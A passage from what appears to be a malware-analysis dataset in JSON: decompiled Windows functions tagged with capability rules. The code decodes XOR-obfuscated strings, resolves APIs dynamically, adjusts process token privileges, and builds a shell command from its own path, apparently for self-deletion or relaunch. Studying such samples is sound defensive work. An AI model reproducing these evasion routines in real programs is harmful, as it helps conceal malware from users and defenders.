uchar var_8bh;\n    uchar var_8ah;\n    uchar var_89h;\n    uchar var_88h;\n    uchar var_87h;\n    uchar var_86h;\n    uchar var_85h;\n    uchar var_84h;\n    uchar var_83h;\n    uchar var_82h;\n    uchar var_81h;\n    uint8_t var_80h [4];\n    uchar var_7ch;\n    uchar var_7bh;\n    uchar var_7ah;\n    uchar var_79h;\n    uchar var_78h;\n    uchar var_77h;\n    uint8_t var_74h [4];\n    uchar var_70h;\n    uchar var_6fh;\n    uint8_t var_6ch [4];\n    uchar var_68h;\n    uchar var_67h;\n    uint var_64h;\n    uchar var_60h;\n    uchar var_5fh;\n    uint var_5ch;\n    uchar var_58h;\n    uchar var_57h;\n    uint var_54h;\n    uchar var_50h;\n    uchar var_4fh;\n    uint var_4ch;\n    uchar var_48h;\n    uchar var_47h;\n    uint var_44h;\n    uchar var_40h;\n    uchar var_3fh;\n    uint8_t var_3ch [4];\n    uchar var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_90h._0_1_ = 0x29;\n    var_90h._1_1_ = 0x78;\n    var_90h._2_1_ = 0x19;\n    var_90h._3_1_ = 0x70;\n    var_8ch = 0x2e;\n    var_8bh = 99;\n    var_8ah = 0x39;\n    var_89h = 0x78;\n    var_88h = 6;\n    var_87h = 0x70;\n    var_86h = 0x26;\n    var_85h = 99;\n    var_84h = 0x29;\n    var_83h = 0x78;\n    var_82h = 0x56;\n    var_81h = 0x70;\n    var_44h._0_1_ = 0x6a;\n    var_44h._1_1_ = 0x78;\n    var_44h._2_1_ = 0x56;\n    var_44h._3_1_ = 0x70;\n    var_40h = 99;\n    var_3fh = 99;\n    fcn.004012a0(0x20);\n    for (var_4h = 0; var_4h < 0x10; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_90h + var_4h) ^ *(&var_44h + var_4h % 6));\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, &lpString2, 0x104);\n    if (iVar1 != 0) {\n        uVar2 = fcn.00401270(&var_9a8h, 0x104);\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableW)(uVar2);\n        if (iVar1 != 0) {\n            var_134h._0_1_ = 0x75;\n            var_134h._1_1_ = 100;\n            var_134h._2_1_ = 0x12;\n            var_134h._3_1_ = 0x52;\n            var_130h = 0x66;\n            var_12fh = 0x47;\n            var_12eh = 0x2a;\n            var_12dh = 100;\n            var_12ch = 0x18;\n            var_12bh = 0x52;\n            var_12ah = 0x28;\n            var_129h = 0x47;\n            var_128h = 0x3d;\n            var_127h = 100;\n            var_126h = 0x51;\n            var_125h = 0x52;\n            var_124h = 0x2a;\n            var_123h = 0x47;\n            var_122h = 0x35;\n            var_121h = 100;\n            var_120h = 0x12;\n            var_11fh = 0x52;\n            var_11eh = 0x27;\n            var_11dh = 0x47;\n            var_11ch = 0x36;\n            var_11bh = 100;\n            var_11ah = 0x19;\n            var_119h = 0x52;\n            var_118h = 0x29;\n            var_117h = 0x47;\n            var_116h = 0x29;\n            var_115h = 100;\n            var_114h = 5;\n            var_113h = 0x52;\n            var_112h = 0x66;\n            var_111h = 0x47;\n            var_110h = 0x77;\n            var_10fh = 100;\n            var_10eh = 0x1f;\n            var_10dh = 0x52;\n            var_10ch = 0x66;\n            var_10bh = 0x47;\n            var_10ah = 0x6e;\n            var_109h = 100;\n            var_108h = 0x51;\n            var_107h = 0x52;\n            var_106h = 0x60;\n            var_105h = 0x47;\n            var_104h = 0x7a;\n            var_103h = 100;\n            var_102h = 0x15;\n            var_101h = 0x52;\n            var_100h = 0x23;\n            var_ffh = 0x47;\n            var_feh = 0x36;\n            var_fdh = 100;\n            var_fch = 0x51;\n            var_fbh = 0x52;\n            var_fah = 0x69;\n            var_f9h = 0x47;\n            var_f8h = 0x1c;\n            var_f7h = 100;\n            var_f6h = 0x51;\n            var_f5h = 0x52;\n            var_f4h = 0x69;\n            var_f3h = 0x47;\n            var_f2h = 0xb;\n            var_f1h = 100;\n            var_f0h = 0x51;\n            var_efh = 0x52;\n            var_eeh = 100;\n            var_edh = 0x47;\n            var_ech = 0x5a;\n            var_ebh = 100;\n            var_4ch._0_1_ = 0x5a;\n            var_4ch._1_1_ = 100;\n            var_4ch._2_1_ = 0x71;\n            var_4ch._3_1_ = 0x52;\n            var_48h = 0x46;\n            var_47h = 0x47;\n            fcn.004012a0(0x94);\n            for (var_8h = 0; var_8h < 0x4a; var_8h = var_8h + 1) {\n                fcn.00401280(var_8h, *(&var_134h + var_8h) ^ *(&var_4ch + var_8h % 6));\n            }\n            uVar2 = fcn.00401270();\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(&lpString1, uVar2);\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, &lpString2);\n            var_a0h._0_1_ = 0x6a;\n            var_a0h._1_1_ = 0x55;\n            var_a0h._2_1_ = 0x74;\n            var_a0h._3_1_ = 0x4d;\n            var_9ch = 0x4a;\n            var_9bh = 0x70;\n            var_9ah = 0x68;\n            var_99h = 0x55;\n            var_98h = 0x3a;\n            var_97h = 0x4d;\n            var_96h = 1;\n            var_95h = 0x70;\n            var_94h = 0x24;\n            var_93h = 0x55;\n            var_92h = 0x54;\n            var_91h = 0x4d;\n            var_54h._0_1_ = 0x48;\n            var_54h._1_1_ = 0x55;\n            var_54h._2_1_ = 0x54;\n            var_54h._3_1_ = 0x4d;\n            var_50h = 0x74;\n            var_4fh = 0x70;\n            fcn.004012a0(0x20);\n            for (var_ch = 0; var_ch < 0x10; var_ch = var_ch + 1) {\n                fcn.00401280(var_ch, *(&var_a0h + var_ch) ^ *(&var_54h + var_ch % 6));\n            }\n            uVar2 = fcn.00401270();\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, uVar2);\n            if (arg_8h != 0) {\n                var_d0h._0_1_ = 0x69;\n                var_d0h._1_1_ = 0x4c;\n                var_d0h._2_1_ = 0x59;\n                var_d0h._3_1_ = 0x31;\n                var_cch = 0x17;\n                var_cbh = 0x6e;\n                var_cah = 0x20;\n                var_c9h = 0x4c;\n                var_c8h = 0xf;\n                var_c7h = 0x31;\n                var_c6h = 0x1f;\n                var_c5h = 0x6e;\n                var_c4h = 0x6f;\n                var_c3h = 0x4c;\n                var_c2h = 0x56;\n                var_c1h = 0x31;\n                var_c0h = 0x23;\n                var_bfh = 0x6e;\n                var_beh = 0x6f;\n                var_bdh = 0x4c;\n                var_bch = 0x5b;\n                var_bbh = 0x31;\n                var_bah = 0x7a;\n                var_b9h = 0x6e;\n                var_5ch._0_1_ = 0x4f;\n                var_5ch._1_1_ = 0x4c;\n                var_5ch._2_1_ = 0x79;\n                var_5ch._3_1_ = 0x31;\n                var_58h = 0x7a;\n                var_57h = 0x6e;\n                fcn.004012a0(0x30);\n                for (var_10h = 0; var_10h < 0x18; var_10h = var_10h + 1) {\n                    fcn.00401280(var_10h, *(&var_d0h + var_10h) ^ *(&var_5ch + var_10h % 6));\n                }\n                uVar2 = fcn.00401270();\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, uVar2);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, &lpString2);\n                var_b8h[0] = 0x4d;\n                var_b8h[1] = 0x45;\n                var_b8h[2] = 0x36;\n                var_b8h[3] = 0x36;\n                var_b4h = 9;\n                var_b3h = 0x6f;\n                var_b2h = 7;\n                var_b1h = 0x45;\n                var_b0h = 0x22;\n                var_afh = 0x36;\n                var_aeh = 0xd;\n                var_adh = 0x6f;\n                var_ach = 6;\n                var_abh = 0x45;\n                var_aah = 0x61;\n                var_a9h = 0x36;\n                var_a8h = 0x59;\n                var_a7h = 0x6f;\n                var_a6h = 0x41;\n                var_a5h = 0x45;\n                var_a4h = 0x43;\n                var_a3h = 0x36;\n                var_64h._0_1_ = 99;\n                var_64h._1_1_ = 0x45;\n                var_64h._2_1_ = 0x43;\n                var_64h._3_1_ = 0x36;\n                var_60h = 0x79;\n                var_5fh = 0x6f;\n                fcn.004012a0(0x2c);\n                for (var_14h = 0; var_14h < 0x16; var_14h = var_14h + 1) {\n                    fcn.00401280(var_14h, var_b8h[var_14h] ^ *(&var_64h + var_14h % 6));\n                }\n                uVar2 = fcn.00401270();\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, uVar2);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, &lpString2);\n                var_e8h[0] = 0x11;\n                var_e8h[1] = 0x42;\n                var_e8h[2] = 99;\n                var_e8h[3] = 0x36;\n                var_e4h = 0x7a;\n                var_e3h = 0x33;\n                var_e2h = 0x62;\n                var_e1h = 0x43;\n                var_e0h = 0x58;\n                var_dfh = 0x44;\n                var_deh = 0x46;\n                var_ddh = 0x42;\n                var_dch = 0x2f;\n                var_dbh = 0x36;\n                var_dah = 100;\n                var_d9h = 0x33;\n                var_d8h = 100;\n                var_d7h = 0x43;\n                var_d6h = 0x16;\n                var_d5h = 0x44;\n                var_d4h = 0x11;\n                var_d3h = 0x42;\n                var_d2h = 0x43;\n                var_d1h = 0x36;\n                var_3ch[0] = 0x33;\n                var_3ch[1] = 0x42;\n                var_3ch[2] = 0x43;\n                var_3ch[3] = 0x36;\n                var_38h = 0x44;\n                fcn.004012a0(0x30);\n                for (var_18h = 0; var_18h < 0x18; var_18h = var_18h + 1) {\n                    fcn.00401280(var_18h, var_e8h[var_18h] ^ var_3ch[var_18h % 5]);\n                }\n                uVar2 = fcn.00401270();\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, uVar2);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, &lpString2);\n                var_24h._0_1_ = 0x76;\n                var_24h._1_1_ = 0x4c;\n                var_24h._2_1_ = 0x49;\n                var_24h._3_1_ = 0x66;\n                var_6ch[0] = 0x54;\n                var_6ch[1] = 0x4c;\n                var_6ch[2] = 0x49;\n                var_6ch[3] = 0x66;\n                var_68h = 0x6c;\n                var_67h = 0x42;\n                fcn.004012a0(8);\n                for (var_1ch = 0; var_1ch < 4; var_1ch = var_1ch + 1) {\n                    fcn.00401280(var_1ch, *(&var_24h + var_1ch) ^ var_6ch[var_1ch % 6]);\n                }\n                uVar2 = fcn.00401270();\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, uVar2);\n                fcn.004012d0();\n                fcn.004012d0();\n                fcn.004012d0();\n                fcn.004012d0();\n            }\n            var_80h[0] = 0x5a;\n            var_80h[1] = 0x54;\n            var_80h[2] = 0x14;\n            var_80h[3] = 0x68;\n            var_7ch = 0x15;\n            var_7bh = 0x6b;\n            var_7ah = 0x5b;\n            var_79h = 0x54;\n            var_78h = 100;\n            var_77h = 0x68;\n            var_74h[0] = 0x35;\n            var_74h[1] = 0x54;\n            var_74h[2] = 100;\n            var_74h[3] = 0x68;\n            var_70h = 0x70;\n            var_6fh = 0x6b;\n            fcn.004012a0(0x14);\n            for (var_20h = 0; var_20h < 10; var_20h = var_20h + 1) {\n                fcn.00401280(var_20h, var_80h[var_20h] ^ var_74h[var_20h % 6]);\n            }\n            pExecInfo = 0x3c;\n            var_180h = 0;\n            var_17ch = fcn.00401270();\n            var_178h = &var_9a8h;\n            var_174h = &lpString1;\n            var_170h = 0;\n            var_16ch = 0;\n            var_184h = 0x40;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x100);\n            (*_sym.imp.KERNEL32.dll_SetPriorityClass)(uVar2);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThread)(0xf);\n            (*_sym.imp.KERNEL32.dll_SetThreadPriority)(uVar2);\n            (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n            iVar1 = (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n            if (iVar1 != 0) {\n                (*_sym.imp.KERNEL32.dll_SetPriorityClass)(hProcess, 0x40);\n                (*_sym.imp.KERNEL32.dll_SetProcessPriorityBoost)(hProcess, 1);\n                (*_sym.imp.SHELL32.dll_SHChangeNotify)(4, 5, &lpString2, 0);\n                var_148h = 1;\n                fcn.004012d0();\n                fcn.004012d0();\n                fcn.004012d0();\n                fcn.004012d0();\n                return var_148h;\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20);\n            (*_sym.imp.KERNEL32.dll_SetPriorityClass)(uVar2);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThread)(0);\n            (*_sym.imp.KERNEL32.dll_SetThreadPriority)(uVar2);\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n        }\n    }\n    var_14ch = 0;\n    fcn.004012d0();\n    return var_14ch;\n}\n",
        "token_count": 6012
    },
    "00424590": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.00424590(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    uint var_8h;\n    uint var_1h;\n    \n    while( true ) {\n        if (arg_10h == 0) {\n            return 0;\n        }\n        if (*arg_8h != *arg_ch) break;\n        arg_8h = arg_8h + 1;\n        arg_ch = arg_ch + 1;\n        arg_10h = arg_10h + -1;\n    }\n    return *arg_8h - *arg_ch;\n}\n",
        "token_count": 160
    },
    "004245f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004245f0(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    \n    if (arg_8h != NULL) {\n        if (arg_8h[1] != 0) {\n            puVar3 = arg_8h[1];\n            for (iVar2 = *arg_8h; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, arg_8h[1]);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n        arg_8h[1] = 0;\n        *arg_8h = 0;\n    }\n    return;\n}\n",
        "token_count": 204
    },
    "00424640": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00424640(uint arg_8h, int32_t TokenHandle)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_1ch;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (TokenHandle == 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n        iVar1 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar2);\n        if (iVar1 != 0) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, arg_8h, &var_ch);\n            if (iVar1 != 0) {\n                var_1ch = 1;\n                uStack28 = var_ch;\n                uStack24 = var_8h;\n                uStack20 = 2;\n                var_4h = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &var_1ch, 0x10, 0, 0);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, arg_8h, &var_ch);\n        if (iVar1 != 0) {\n            var_1ch = 1;\n            uStack28 = var_ch;\n            uStack24 = var_8h;\n            uStack20 = 2;\n            var_4h = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &var_1ch, 0x10, 0, 0);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 432
    },
    "00404180": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00404180(uint arg_8h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    code *pcVar4;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uchar var_8ch;\n    uchar var_8bh;\n    uchar var_8ah;\n    uchar var_89h;\n    uchar var_88h;\n    uchar var_87h;\n    uchar var_86h;\n    uchar var_85h;\n    uchar var_84h;\n    uchar var_83h;\n    uchar var_82h;\n    uchar var_81h;\n    uint8_t var_80h [4];\n    uchar var_7ch;\n    uchar var_7bh;\n    uchar var_7ah;\n    uchar var_79h;\n    uchar var_78h;\n    uchar var_77h;\n    uchar var_76h;\n    uchar var_75h;\n    uchar var_74h;\n    uchar var_73h;\n    uchar var_72h;\n    uint var_70h;\n    uchar var_6ch;\n    uchar var_6bh;\n    uchar var_6ah;\n    uchar var_69h;\n    uchar var_68h;\n    uchar var_67h;\n    uchar var_66h;\n    uchar var_65h;\n    uchar var_64h;\n    uint var_60h;\n    uchar var_5ch;\n    uchar var_5bh;\n    uchar var_5ah;\n    uchar var_59h;\n    uchar var_58h;\n    uchar var_57h;\n    uint8_t var_54h [4];\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uint var_48h;\n    uchar var_44h;\n    uchar var_43h;\n    uint var_40h;\n    uchar var_3ch;\n    uchar var_3bh;\n    uint8_t var_38h [4];\n    uchar var_34h;\n    uint var_30h;\n    uchar var_2ch;\n    uint var_28h;\n    uchar var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_70h._0_1_ = 0xd;\n    var_70h._1_1_ = 0x51;\n    var_70h._2_1_ = 0x36;\n    var_70h._3_1_ = 0x5a;\n    var_6ch = 0x3f;\n    var_6bh = 0;\n    var_6ah = 0x55;\n    var_69h = 6;\n    var_68h = 0x6a;\n    var_67h = 0x50;\n    var_66h = 0x36;\n    var_65h = 0;\n    var_64h = 0x66;\n    var_40h._0_1_ = 0x66;\n    var_40h._1_1_ = 0x34;\n    var_40h._2_1_ = 0x44;\n    var_40h._3_1_ = 0x34;\n    var_3ch = 0x5a;\n    var_3bh = 0x6c;\n    fcn.004012a0(0xd);\n    for (var_8h = 0; var_8h < 0xd; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_70h + var_8h) ^ *(&var_40h + var_8h % 6));\n    }\n    var_60h._0_1_ = 0xb;\n    var_60h._1_1_ = 0x31;\n    var_60h._2_1_ = 0x1c;\n    var_60h._3_1_ = 0x2c;\n    var_5ch = 5;\n    var_5bh = 0x15;\n    var_5ah = 0x22;\n    var_59h = 0x35;\n    var_58h = 0x33;\n    var_57h = 0x48;\n    var_48h._0_1_ = 0x4d;\n    var_48h._1_1_ = 0x58;\n    var_48h._2_1_ = 0x72;\n    var_48h._3_1_ = 0x48;\n    var_44h = 0x44;\n    var_43h = 0x61;\n    fcn.004012a0(10);\n    for (var_ch = 0; var_ch < 10; var_ch = var_ch + 1) {\n        fcn.00401280(var_ch, *(&var_60h + var_ch) ^ *(&var_48h + var_ch % 6));\n    }\n    var_90h._0_1_ = 0xc;\n    var_90h._1_1_ = 10;\n    var_90h._2_1_ = 0x5d;\n    var_90h._3_1_ = 0x10;\n    var_8ch = 0xf;\n    var_8bh = 0x27;\n    var_8ah = 0x20;\n    var_89h = 0x5b;\n    var_88h = 0x1c;\n    var_87h = 10;\n    var_86h = 10;\n    var_85h = 0x12;\n    var_84h = 0x5d;\n    var_83h = 0x1f;\n    var_82h = 0x2f;\n    var_81h = 0x4b;\n    var_28h._0_1_ = 0x4b;\n    var_28h._1_1_ = 0x66;\n    var_28h._2_1_ = 0x32;\n    var_28h._3_1_ = 0x72;\n    var_24h = 0x6e;\n    fcn.004012a0(0x10);\n    for (var_10h = 0; var_10h < 0x10; var_10h = var_10h + 1) {\n        fcn.00401280(var_10h, *(&var_90h + var_10h) ^ *(&var_28h + var_10h % 5));\n    }\n    uVar2 = fcn.00401270();\n    uVar2 = fcn.00401270(uVar2);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar2);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar2 = fcn.00401270();\n    uVar2 = fcn.00401270(uVar2);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar2);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    iVar1 = (*pcVar4)(arg_8h);\n    if ((iVar1 == 0) && (iVar1 = (*pcVar3)(arg_8h),  iVar1 == 0)) {\n        var_80h[0] = 0xe;\n        var_80h[1] = 0x26;\n        var_80h[2] = 0xb;\n        var_80h[3] = 0x10;\n        var_7ch = 0x38;\n        var_7bh = 0x25;\n        var_7ah = 0xb;\n        var_79h = 0;\n        var_78h = 0x16;\n        var_77h = 0x18;\n        var_76h = 0x3d;\n        var_75h = 0x25;\n        var_74h = 9;\n        var_73h = 0x33;\n        var_72h = 0x59;\n        var_30h._0_1_ = 0x49;\n        var_30h._1_1_ = 0x4a;\n        var_30h._2_1_ = 100;\n        var_30h._3_1_ = 0x72;\n        var_2ch = 0x59;\n        fcn.004012a0(0xf);\n        for (var_14h = 0; var_14h < 0xf; var_14h = var_14h + 1) {\n            fcn.00401280(var_14h, var_80h[var_14h] ^ *(&var_30h + var_14h % 5));\n        }\n        var_54h[0] = 4;\n        var_54h[1] = 0;\n        var_54h[2] = 0x5c;\n        var_54h[3] = 0xc;\n        var_50h = 0x47;\n        var_4fh = 0x2a;\n        var_4eh = 9;\n        var_4dh = 0x79;\n        var_4ch = 0x4d;\n        var_38h[0] = 0x45;\n        var_38h[1] = 100;\n        var_38h[2] = 0x38;\n        var_38h[3] = 0x4d;\n        var_34h = 0x33;\n        fcn.004012a0(9);\n        for (var_18h = 0; var_18h < 9; var_18h = var_18h + 1) {\n            fcn.00401280(var_18h, var_54h[var_18h] ^ var_38h[var_18h % 5]);\n        }\n        uVar2 = fcn.00401270();\n        uVar2 = fcn.00401270(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar2);\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        uVar2 = fcn.00401270();\n        uVar2 = fcn.00401270(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar2);\n        pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        (*pcVar4)(arg_8h);\n        (*pcVar3)(arg_8h);\n        fcn.004012d0();\n        fcn.004012d0();\n        fcn.004012d0();\n        fcn.004012d0();\n        fcn.004012d0();\n        uVar2 = 1;\n    }\n    else {\n        fcn.004012d0();\n        fcn.004012d0();\n        fcn.004012d0();\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 2620
    },
    "00411130": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00411130(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_4ch;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uint var_34h;\n    uchar var_30h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uchar var_2dh;\n    uchar var_2ch;\n    uchar var_2bh;\n    uint8_t var_28h [4];\n    uchar var_24h;\n    uint var_20h;\n    uchar var_1ch;\n    uint var_18h;\n    code *var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_34h._0_1_ = 0x27;\n    var_34h._1_1_ = 0x1f;\n    var_34h._2_1_ = 5;\n    var_34h._3_1_ = 1;\n    var_30h = 0x3d;\n    var_2fh = 0x67;\n    var_2eh = 0xf;\n    var_2dh = 0xd;\n    var_2ch = 1;\n    var_2bh = 0x51;\n    var_20h._0_1_ = 0x49;\n    var_20h._1_1_ = 0x6b;\n    var_20h._2_1_ = 0x61;\n    var_20h._3_1_ = 0x6d;\n    var_1ch = 0x51;\n    fcn.004012a0(10);\n    for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_34h + var_4h) ^ *(&var_20h + var_4h % 5));\n    }\n    var_4ch._0_1_ = 0x1a;\n    var_4ch._1_1_ = 0x13;\n    var_4ch._2_1_ = 0x2e;\n    var_4ch._3_1_ = 0x1b;\n    var_48h = 0x3e;\n    var_47h = 0x1b;\n    var_46h = 0x13;\n    var_45h = 0x23;\n    var_44h = 0x21;\n    var_43h = 0x3f;\n    var_42h = 0x3b;\n    var_41h = 0x33;\n    var_40h = 0x2d;\n    var_3fh = 0x11;\n    var_3eh = 0x25;\n    var_3dh = 0x3b;\n    var_3ch = 0x22;\n    var_3bh = 0x30;\n    var_3ah = 0x27;\n    var_39h = 0x25;\n    var_38h = 0x3a;\n    var_37h = 0x67;\n    var_28h[0] = 0x48;\n    var_28h[1] = 0x67;\n    var_28h[2] = 0x42;\n    var_28h[3] = 0x55;\n    var_24h = 0x4a;\n    fcn.004012a0(0x16);\n    for (var_8h = 0; var_8h < 0x16; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_4ch + var_8h) ^ var_28h[var_8h % 5]);\n    }\n    uVar1 = fcn.00401270();\n    uVar1 = fcn.00401270(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar1);\n    var_14h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    var_18h = (*var_14h)(arg_8h);\n    fcn.004012d0();\n    fcn.004012d0();\n    return var_18h;\n}\n",
        "token_count": 1120
    },
    "00411620": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00411620(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_5ch;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uint8_t var_48h [4];\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uint var_3ch;\n    uint var_34h;\n    uchar var_30h;\n    uchar var_2fh;\n    uint8_t var_2ch [4];\n    uchar var_28h;\n    uint var_24h;\n    code *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_18h = 0;\n    var_1ch = 0;\n    puVar3 = &var_3ch;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_5ch._0_1_ = 0x22;\n    var_5ch._1_1_ = 0x39;\n    var_5ch._2_1_ = 0x75;\n    var_5ch._3_1_ = 3;\n    var_58h = 9;\n    var_57h = 0x6e;\n    var_56h = 5;\n    var_55h = 0x28;\n    var_54h = 0x4f;\n    var_53h = 0x2d;\n    var_52h = 0x1f;\n    var_51h = 0x6b;\n    var_50h = 9;\n    var_4fh = 0x2e;\n    var_4eh = 0x4c;\n    var_4dh = 0xb;\n    var_4ch = 0x16;\n    var_4bh = 0x56;\n    var_4ah = 0x6c;\n    var_34h._0_1_ = 0x6c;\n    var_34h._1_1_ = 0x4d;\n    var_34h._2_1_ = 0x38;\n    var_34h._3_1_ = 0x62;\n    var_30h = 0x79;\n    var_2fh = 0x38;\n    fcn.004012a0(0x13);\n    for (var_4h = 0; var_4h < 0x13; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_5ch + var_4h) ^ *(&var_34h + var_4h % 6));\n    }\n    var_48h[0] = 0x27;\n    var_48h[1] = 0x1f;\n    var_48h[2] = 5;\n    var_48h[3] = 1;\n    var_44h = 0x3d;\n    var_43h = 0x67;\n    var_42h = 0xf;\n    var_41h = 0xd;\n    var_40h = 1;\n    var_3fh = 0x51;\n    